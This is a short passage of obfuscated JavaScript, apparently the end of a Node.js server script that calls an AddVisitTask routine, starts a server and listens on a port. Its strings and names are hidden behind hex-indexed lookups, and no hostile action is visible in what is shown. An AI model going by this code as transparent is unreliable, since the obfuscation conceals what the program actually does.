AddVisitTask();}catch(_0x4de9e4){console[_0x4e3418(0x17e)](_0x4e3418(0x1a7),_0x4de9e4);}}startserver()[_0x31c73e(0x1c5)](_0x2615d7=>{const _0xa424da=_0x31c73e;console[_0xa424da(0x17e)](_0xa424da(0x18d),_0x2615d7);}),app[_0x31c73e(0x1e5)](PORT,()=>console[_0x31c73e(0x199)](_0x31c73e(0x1f4)+PORT+'!'));
